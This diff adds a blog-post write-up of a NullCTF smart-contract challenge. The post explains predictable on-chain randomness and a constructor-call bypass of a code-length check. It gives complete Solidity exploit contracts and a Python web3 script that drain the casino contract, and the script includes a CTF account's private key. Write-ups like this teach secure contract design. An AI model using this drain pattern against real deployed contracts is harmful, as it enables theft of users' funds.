@@ -1,0 +1,378 @@
+---
+title: "We go gambling – revenge"
+description: "CREATE2 + constructor-call bypass to precompute wins and drain the NullCTF casino."
+date: 2025-12-05
+tags: ['ethereum', 'solidity', 'create2', 'rng', 'ctftime']
+authors: ['0xasta']
+toc: false
+---
+
+# Casino
+
+Category: Blockchain / Smart Contract Pwn  
+Goal: Drain the Casino's ETH balance to less than 1 Ether
+
+## Challenge Overview
+
+This challenge provides a pair of contracts: `Casino.sol` (the target) and `Setup.sol` (initializer). The casino lets users buy "LuckTokens" for ETH, bet tokens via `play()` for a chance to quadruple their tokens, and sell tokens back for ETH. The objective is to exploit weaknesses in the casino logic to reliably win and withdraw value until the casino's ETH drops below 1 ETH.
+
+Below I describe the vulnerabilities, the exploitation strategy, and a concrete exploit (both Solidity and orchestration in Python). At the end I show the flag obtained during the solve.
+
+---
+
+## Vulnerability Analysis
+
+Two combined issues make the contract breakable with 100% win rate:
+
+1) Predictable Randomness (On-chain PRNG)
+- The casino calculates randomness with:
+```solidity
+uint256 random = uint256(keccak256(abi.encodePacked(
+    block.timestamp, 
+    block.prevrandao, 
+    msg.sender
+))) % 100;
+```
+- `block.timestamp` and `block.prevrandao` are constant across transactions in the same block. The only variability is `msg.sender`.
+- If you can predict `msg.sender` for the call (i.e., precompute it when planning a deployment), you can compute the random outcome off-chain for the upcoming transaction.
+
+2) Contract Code Size Check Bypass (constructor calling)
+- The casino refuses contract callers via:
+```solidity
+require(msg.sender.code.length == 0, "Contracts are not allowed to play");
+```
+- However, during a contract's constructor, its code is not yet stored on-chain — `msg.sender.code.length == 0` holds true during the constructor. That allows a freshly-deployed contract to call `play()` inside its constructor and bypass the restriction.
+
+Combined, these let an attacker:
+- Predict the RNG for a prospective caller address computed deterministically (CREATE2).
+- Deploy a disposable contract (Gambler) in a way that calls `play()` from within the constructor (so code length check passes) and reliably wins when the RNG is predicted in advance.
+
+---
+
+## Exploit Strategy
+
+High-level plan:
+
+1. Create a Solver (factory) contract that:
+   - Computes the CREATE2 address where a Gambler contract would be deployed for a given salt.
+   - Computes the casino RNG result for that predicted address using current block values.
+   - Only deploys the Gambler via CREATE2 when the precomputed RNG indicates a win (random < 25).
+   - The Gambler's constructor will:
+     - Buy LuckTokens using sent ETH.
+     - Approve the casino for token transfers.
+     - Call `play()` (guaranteed to win for predicted addresses).
+     - Sell the winnings back to the casino.
+     - Forward the ETH back to the Solver.
+
+2. Loop the above, adjusting bet size by the casino's liquidity: you can't bet more than casino.balance/3 (payout math means casino must have 3 * bet to remain solvent after payout). Keep repeating until the casino balance is < 1 ETH.
+
+Notes on bet sizing (liquidity constraint):
+- If you bet B:
+  - Casino receives B when you buy tokens.
+  - On a win you receive 4B tokens; selling them will drain 4B ETH from the casino.
+  - Net casino change = +B - 4B = -3B
+  - To keep the sell feasible, the casino must have at least 3B (from its pre-bet balance).
+  - So maximum safe bet: casino.balance / 3.
+
+---
+
+## Solution Code
+
+Below is a tested exploit pattern. The `Gambler` is disposable and performs the entire interaction within its constructor. The `Solver` orchestrates deterministic address prediction using CREATE2 and selectively deploys `Gambler` instances only when the RNG will return a winning value.
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface ICasino {
+    function buyLuck() external payable;
+    function sellLuck(uint256 amount) external;
+    function play(uint256 betAmount) external;
+    function token() external view returns (address);
+}
+
+interface IERC20 {
+    function balanceOf(address account) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transfer(address to, uint256 amount) external returns (bool);
+}
+
+// Disposable Gambler: executes entire attack in constructor
+contract Gambler {
+    constructor(address _casino) payable {
+        ICasino casino = ICasino(_casino);
+        IERC20 token = IERC20(casino.token());
+
+        // Buy Luck tokens with all received ETH
+        casino.buyLuck{value: msg.value}();
+
+        // Approve Casino to pull tokens
+        token.approve(address(casino), type(uint256).max);
+
+        // Play using our token balance (we precomputed RNG so this will win)
+        casino.play(token.balanceOf(address(this)));
+
+        // Sell all tokens back for ETH
+        casino.sellLuck(token.balanceOf(address(this)));
+
+        // Forward funds to deployer (Solver)
+        payable(msg.sender).transfer(address(this).balance);
+    }
+}
+
+// Solver factory: predicts addresses for CREATE2, checks RNG, deploys winners
+contract Solver {
+    ICasino public casino;
+
+    constructor(address _casino) {
+        casino = ICasino(_casino);
+    }
+
+    function attack() external payable {
+        // Pre-compute Gambler bytecode hash for address prediction via CREATE2
+        bytes memory bytecode = abi.encodePacked(
+            type(Gambler).creationCode,
+            abi.encode(address(casino))
+        );
+        bytes32 bytecodeHash = keccak256(bytecode);
+        uint256 salt = 0;
+
+        // Keep running until casino drained below 1 ETH
+        while (address(casino).balance >= 1 ether) {
+            // Cap bet size to casino liquidity (casino must have 3 * bet to pay)
+            uint256 maxSafeBet = address(casino).balance / 3;
+            uint256 myBalance = address(this).balance;
+            uint256 betAmount = myBalance < maxSafeBet ? myBalance : maxSafeBet;
+            if (betAmount == 0) break;
+
+            // Predict CREATE2 address for Gambler with current salt
+            address predictedAddress = address(uint160(uint(keccak256(abi.encodePacked(
+                bytes1(0xff),
+                address(this),
+                salt,
+                bytecodeHash
+            )))));
+
+            // Compute the RNG exactly as Casino does
+            uint256 random = uint256(keccak256(abi.encodePacked(
+                block.timestamp, 
+                block.prevrandao, 
+                predictedAddress
+            ))) % 100;
+
+            // Only deploy a Gambler when RNG indicates a win (<25)
+            if (random < 25) {
+                // Deploy Gambler with CREATE2 and fund it with betAmount
+                new Gambler{value: betAmount, salt: bytes32(salt)}(address(casino));
+            }
+
+            salt++;
+        }
+
+        // Transfer profits to caller
+        payable(msg.sender).transfer(address(this).balance);
+    }
+
+    receive() external payable {}
+}
+```
+
+Orchestration example (Python) — compile & deploy `Solver`, then call `attack()` with initial capital:
+
+```python
+import time
+from web3 import Web3
+from solcx import install_solc, compile_source, set_solc_version
+
+# --- Configuration ---
+RPC_URL = "http://public.ctf.r0devnull.team:3013/2d98ba49-938f-4d46-a895-6c4fac440070"
+PRIV_KEY = "b39048ff9f238c23eee90f488186155de167e689b9f455ed3a21533bac034db3"
+SETUP_ADDR = "0x3CD755D9c5D72f70497033c8e1C53014E2B92186"
+
+def solve():
+    # 1. Install & Set Solidity Version
+    print("[*] Installing Solidity compiler...")
+    install_solc('0.8.20')
+    set_solc_version('0.8.20') # Set as active version
+
+    # Connect to RPC
+    w3 = Web3(Web3.HTTPProvider(RPC_URL))
+    account = w3.eth.account.from_key(PRIV_KEY)
+    print(f"[*] Connected as: {account.address}")
+
+    # --- Solidity Exploit Code ---
+    SOLVER_CODE = """
+    // SPDX-License-Identifier: MIT
+    pragma solidity ^0.8.0;
+
+    interface ICasino {
+        function buyLuck() external payable;
+        function sellLuck(uint256 amount) external;
+        function play(uint256 betAmount) external;
+        function token() external view returns (address);
+    }
+
+    interface IERC20 {
+        function balanceOf(address account) external view returns (uint256);
+        function approve(address spender, uint256 amount) external returns (bool);
+        function transfer(address to, uint256 amount) external returns (bool);
+    }
+
+    contract Gambler {
+        constructor(address _casino) payable {
+            ICasino casino = ICasino(_casino);
+            IERC20 token = IERC20(casino.token());
+
+            // 1. Buy Luck tokens with all ETH sent
+            casino.buyLuck{value: msg.value}();
+
+            // 2. Approve Casino to take tokens
+            token.approve(address(casino), type(uint256).max);
+
+            // 3. Play (We know we will win because Solver checked RNG)
+            casino.play(token.balanceOf(address(this)));
+
+            // 4. Sell all tokens back for ETH
+            casino.sellLuck(token.balanceOf(address(this)));
+
+            // 5. Return ETH to Solver
+            (bool success, ) = msg.sender.call{value: address(this).balance}("");
+            require(success, "Transfer failed");
+        }
+    }
+
+    contract Solver {
+        ICasino public casino;
+
+        constructor(address _casino) {
+            casino = ICasino(_casino);
+        }
+
+        function attack() external payable {
+            require(msg.value > 0, "Need seed money");
+            
+            bytes memory bytecode = abi.encodePacked(
+                type(Gambler).creationCode,
+                abi.encode(address(casino))
+            );
+            bytes32 bytecodeHash = keccak256(bytecode);
+            uint256 salt = 0;
+
+            // Loop until Casino is empty (less than 1 ether)
+            while (address(casino).balance >= 1 ether) {
+                
+                // Safety Check: Avoid infinite loop if gas runs out or logic fails
+                if (salt > 500) break; 
+
+                uint256 casinoBal = address(casino).balance;
+                uint256 maxSafeBet = casinoBal / 3; 
+                uint256 myBal = address(this).balance;
+                
+                uint256 betAmount = myBal < maxSafeBet ? myBal : maxSafeBet;
+
+                address predictedAddress = address(uint160(uint(keccak256(abi.encodePacked(
+                    bytes1(0xff),
+                    address(this),
+                    salt,
+                    bytecodeHash
+                )))));
+
+                uint256 random = uint256(keccak256(abi.encodePacked(
+                    block.timestamp, 
+                    block.prevrandao, 
+                    predictedAddress
+                ))) % 100;
+
+                if (random < 25) {
+                    new Gambler{value: betAmount, salt: bytes32(salt)}(address(casino));
+                }
+
+                salt++;
+            }
+
+            payable(msg.sender).transfer(address(this).balance);
+        }
+
+        receive() external payable {}
+    }
+    """
+
+    # 2. Compile with Explicit Version
+    print("[*] Compiling Exploit Contracts...")
+    compiled = compile_source(
+        SOLVER_CODE, 
+        output_values=['abi', 'bin'],
+        solc_version='0.8.20'  # <--- FIXED: Explicit version
+    )
+    
+    # Get the Solver contract
+    solver_interface = compiled['<stdin>:Solver']
+
+    # 3. Get Casino Address from Setup
+    setup_abi = [{"inputs":[],"name":"casino","outputs":[{"internalType":"contract Casino","name":"","type":"address"}],"stateMutability":"view","type":"function"}]
+    setup_contract = w3.eth.contract(address=SETUP_ADDR, abi=setup_abi)
+    casino_addr = setup_contract.functions.casino().call()
+    print(f"[*] Found Casino at: {casino_addr}")
+
+    # 4. Deploy Solver
+    print("[*] Deploying Solver...")
+    Solver = w3.eth.contract(abi=solver_interface['abi'], bytecode=solver_interface['bin'])
+    
+    construct_txn = Solver.constructor(casino_addr).build_transaction({
+        'from': account.address,
+        'nonce': w3.eth.get_transaction_count(account.address),
+        'gas': 3000000, 
+        'gasPrice': w3.eth.gas_price
+    })
+    
+    signed_tx = w3.eth.account.sign_transaction(construct_txn, private_key=PRIV_KEY)
+    tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
+    print(f"[*] Solver Deployment TX: {tx_hash.hex()}")
+    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
+    solver_instance = w3.eth.contract(address=receipt.contractAddress, abi=solver_interface['abi'])
+    print(f"[*] Solver deployed at: {solver_instance.address}")
+
+    # 5. Attack
+    print("[*] Launching Attack (this may take a moment)...")
+    
+    attack_txn = solver_instance.functions.attack().build_transaction({
+        'from': account.address,
+        'value': w3.to_wei(1, 'ether'), 
+        'nonce': w3.eth.get_transaction_count(account.address),
+        'gas': 15000000, 
+        'gasPrice': w3.eth.gas_price
+    })
+
+    signed_attack = w3.eth.account.sign_transaction(attack_txn, private_key=PRIV_KEY)
+    attack_hash = w3.eth.send_raw_transaction(signed_attack.raw_transaction)
+    print(f"[*] Attack TX sent: {attack_hash.hex()}")
+    w3.eth.wait_for_transaction_receipt(attack_hash)
+    print("[*] Attack confirmed.")
+
+    # 6. Check Solved Status
+    is_solved_abi = [{"inputs":[],"name":"isSolved","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"}]
+    setup_check = w3.eth.contract(address=SETUP_ADDR, abi=is_solved_abi)
+    if setup_check.functions.isSolved().call():
+        print("\n[SUCCESS] Challenge Solved! You can now submit the flag.")
+    else:
+        print("\n[FAIL] Challenge not solved yet. Check logs.")
+
+if __name__ == "__main__":
+    solve()
+```
+
+---
+
+## Example Run & Flag
+
+Using the above approach against the challenge instance produced the flag:
+
+nullctf{0ps_i_m3ss3d_up_sh0uld_b3_0k_n0w_ty}
+
+---
+
+## Conclusion & Mitigations
+
+Why this works:
+- On-chain randomness derived from predictable on-block values plus `msg.sender` is fragile if the attacker can control or predict caller addresses.
+- Bans based on `msg.sender.code.length` can be bypassed by attackers who perform actions during a contract's constructor.
